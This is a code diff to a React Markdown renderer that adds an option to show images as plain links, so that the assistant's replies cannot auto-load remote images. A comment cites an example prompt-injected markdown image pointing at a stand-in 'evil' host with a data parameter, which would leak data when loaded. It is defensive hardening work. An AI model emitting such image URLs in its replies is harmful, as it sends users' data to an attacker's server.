@@ -13,9 +13,16 @@ export function Markdown({
   source,
   className,
   outline,
+  images = true,
 }: {
   source: string
   className?: string
+  /**
+   * false: image lines become plain links instead of <img>. For text the owner
+   * didn't write (the assistant's replies): an image loads with no click, so a
+   * prompt-injected ![](https://evil/?d=…) would leak data to that host.
+   */
+  images?: boolean
   /**
    * Long-form reading (case studies): the body's top heading level becomes an
    * h2 whatever the author typed, and headings get ids for a table of contents
@@ -23,12 +30,14 @@ export function Markdown({
    */
   outline?: boolean
 }) {
-  return <div className={className}>{renderMarkdown(source, outline ? outlineOptions(source) : undefined)}</div>
+  const options = outline ? outlineOptions(source) : undefined
+  return <div className={className}>{renderMarkdown(source, images ? options : { ...(options ?? baseOptions), images: false })}</div>
 }
 
 export type OutlineItem = { id: string; text: string; level: 2 | 3 | 4 }
 
-type RenderOptions = { shift: number; ids: Map<number, string> }
+type RenderOptions = { shift: number; ids: Map<number, string>; images?: boolean }
+const baseOptions: RenderOptions = { shift: 0, ids: new Map() }
 
 /** "What I built" → "what-i-built"; duplicates get -2, -3. Diacritics fold (Směny → smeny). */
 function slugify(text: string, taken: Set<string>) {
@@ -287,6 +296,7 @@ export function renderMarkdown(source: string, options?: RenderOptions): ReactNo
           </blockquote>
         )
       case "images":
+        if (options?.images === false) return <ImageLinks key={key} items={block.items} />
         return <Figures key={key} items={block.items} />
       case "code":
         return (
@@ -296,6 +306,30 @@ export function renderMarkdown(source: string, options?: RenderOptions): ReactNo
         )
     }
   })
+}
+
+/** Images as links, nothing loaded until a click (see Markdown's `images`). */
+function ImageLinks({ items }: { items: MarkdownImage[] }) {
+  return (
+    <p className="my-4">
+      {items.map((item, j) => {
+        const href = safeImageSrc(item.src)
+        const label = item.alt.trim() || "image"
+        return (
+          <span key={j}>
+            {j > 0 && " · "}
+            {href ? (
+              <a href={href} className={linkClass} {...externalProps(href)}>
+                {label}
+              </a>
+            ) : (
+              label
+            )}
+          </span>
+        )
+      })}
+    </p>
+  )
 }
 
 /**
